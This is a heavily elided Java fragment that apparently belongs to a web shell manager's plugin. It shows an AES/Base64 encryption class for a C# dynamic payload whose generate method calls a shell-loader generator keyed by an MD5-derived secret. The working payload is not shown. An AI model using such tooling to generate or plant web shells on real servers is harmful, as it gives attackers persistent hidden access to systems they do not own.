...
@CryptionAnnotation(
        Name = "CSHAP_AES_BASE64bohemian",
        payloadName = "CShapDynamicPayload"
)
public class CShapAesbase64bohemian implements Cryption {
...
//        this.findStrRight = findStrMd5.substring(16).toUpperCase();
    ...
    public byte[] generate(String password, String secretKey) {
        ...
        return Generate.GenerateShellLoder(password, functions.md5(secretKey).substring(0, 16), true,this.getClass().getSimpleName());
